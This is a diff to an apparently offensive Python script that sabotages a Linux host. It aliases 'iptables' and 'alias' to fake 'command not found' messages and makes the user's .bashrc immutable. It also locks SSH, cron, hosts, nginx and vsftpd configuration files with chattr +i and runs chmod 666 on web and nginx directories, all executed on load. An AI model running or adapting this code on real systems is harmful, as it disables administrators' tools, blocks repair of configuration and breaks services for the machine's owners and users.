@@ -21,6 +21,32 @@ def edit_bashrc():
             f.write('alias iptables="echo iptables: command not found"\n')
             f.write('alias alias="echo alias: command not found"\n')
             f.close()
+            os.system("chattr +i " + file + "/.bashrc")
 
+def chattr_files():
+    # Set various files to be immutable
+    paths = [
+        "/etc/ssh/sshd_config",
+        "/etc/inputrc",
+        "/etc/crontab",
+        "/etc/hosts",
+        "/etc/nginx/nginx.conf",
+        "/etc/vsftpd.conf"
+    ]
+    for path in paths:
+        if os.path.exists(path):
+            os.system("chattr +i " + path)
+
+def chmod_dirs():
+    # Remove the execute permission from various directories
+    paths = [
+        "/var/www/html/",
+        "/etc/nginx/",
+    ]
+    for path in paths:
+        if os.path.exists(path):
+            os.system("chmod 666 " + path)
 
 edit_bashrc()
+chattr_files()
+chmod_dirs()
